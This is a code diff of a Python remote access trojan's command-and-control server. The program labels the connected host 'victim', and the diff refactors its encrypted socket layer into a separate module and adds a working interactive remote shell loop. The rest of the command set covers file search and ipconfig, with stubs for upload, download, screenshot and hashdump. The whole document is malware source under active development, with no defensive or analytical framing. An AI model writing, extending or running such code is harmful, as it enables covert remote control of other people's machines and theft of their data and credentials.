@@ -1,9 +1,7 @@
 #!/usr/bin/python3
+from secure_socket import Server
 from sys import argv
-import socket
-import rsa
-from cryptography.fernet import Fernet
-MSGLEN=4294967296
+from time import sleep
 
 def help():
   print("""
@@ -33,93 +31,58 @@ def search(victim, filename, path):
   else:
     print(result)
 
-class SecureServer:
-  def __init__(self, host="127.0.0.1", port=62832):
-    self.public_key, self.private_key = rsa.newkeys(2048)
-    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    self.sock.bind((host, port))
-    self.sock.listen()
-    self.client=None
-    print(f"[*] Listening on {port}...")
+def shell(victim):
+  victim.send('shell')
+  ps1=victim.receive()
+  cmd=input(ps1)
+  while cmd!='exit':
+    victim.send(cmd)
+    print(victim.receive())
+    sleep(0.2)
+    ps1=victim.receive()
+    cmd=input(ps1)
+  victim.send('exit')
 
-  def handle_client(self):
-    print("[+] Agent received !")
-    using=True
-    while using:
-      cmd=input("rat > ")
-      command=cmd.split(" ")[0]
-      match command:
-        case 'help':
-          help()
-        case 'download':
-          print('command still in dev :/')
-          #download(cmd.split(" ")[1:])
-        case 'upload':
-          print('command still in dev :/')
-          #upload(cmd.split(" ")[1:])
-        case 'shell':
-          print('command still in dev :/')
-          #shell()
-        case 'ipconfig':
-          ipconfig(self)
-        case 'screenshot':
-          print('command still in dev :/')
-          #screenshot()
-        case 'search':
-          check = cmd.split(" ")
-          if len(check) ==2 and not "" in check:
-            name = check[1]
-            path = '/'
-            search(self,name,path)
-          elif len(check) ==3 and not "" in check :
-            path = check[1]
-            name = check[2]
-            search(self,name,path)
-          else:
-            print("search file [path] Find the location of a file in a directory, defaults to root directory.")
-
-
-        case 'hashdump':
-          print('command still in dev :/')
-          #hashdump()
-        case '':
-          pass
-        case 'exit':
-          using=False
-        case _:
-          print(f"Unknown command : {command}")
-    self.send("exit")
-
-  def run(self):
-    running=True
-    while running:
-      print("[*] Waiting...", end="\r")
-      self.client, client_address = self.sock.accept()
-      self.client.send(self.public_key.save_pkcs1())
-      self.key=Fernet(rsa.decrypt(self.client.recv(2048), self.private_key))
-      self.handle_client()
-
-  def stop(self):
-    self.send("exit")
-    self.sock.close()
-    exit("\r Server stopped.")
-
-  def send(self, message):
-    if self.client==None:
-      return
-    msg=self.key.encrypt(str(message).encode('utf-8'))
-    self.client.send(msg)
-
-  def receive(self):
-    msg=self.client.recv(MSGLEN)
-    message=self.key.decrypt(msg).decode('utf-8')
-    return message
-
-  def get_text(self):
-    text=[]
-    for i in range(int(self.receive())):
-      print(self.receive())
-    return '\n'.join(text)
+def run_command(server, cmd):
+  command=cmd.split(" ")[0]
+  match command:
+    case 'help':
+      help()
+    case 'download':
+      print('command still in dev :/')
+      #download(cmd.split(" ")[1:])
+    case 'upload':
+      print('command still in dev :/')
+      #upload(cmd.split(" ")[1:])
+    case 'shell':
+      shell(server)
+    case 'ipconfig':
+      ipconfig(server)
+    case 'screenshot':
+      print('command still in dev :/')
+      #screenshot()
+    case 'search':
+      check = cmd.split(" ")
+      if len(check) ==2 and not "" in check:
+        name = check[1]
+        path = '/'
+        search(server,name,path)
+      elif len(check) ==3 and not "" in check :
+        path = check[1]
+        name = check[2]
+        search(server,name,path)
+      else:
+        print("search file [path] Find the location of a file in a directory, defaults to root directory.")
+    case 'hashdump':
+      print('command still in dev :/')
+      #hashdump()
+    case '':
+      pass
+    case 'exit':
+      return False
+    case _:
+      print(f"Unknown command : {command}")
+  return True
 
 if __name__ == "__main__":
   try:
@@ -128,8 +91,23 @@ if __name__ == "__main__":
       port=62832
   except:
     port=62832
-  server=SecureServer(port=port)
+    
+  server=Server(port=port)
+  
   try:
-    server.run()
+    running=True
+    while running:
+      print("[*] Waiting...", end="\r")
+      server.accept_client()
+      
+      print("[+] Agent received !")
+      using=True
+      while using:
+        cmd=input("rat > ")
+        using=run_command(server, cmd)
+      server.disconnect()
+
   except KeyboardInterrupt:
     server.stop()
+    
+  print("\r Server stopped.")
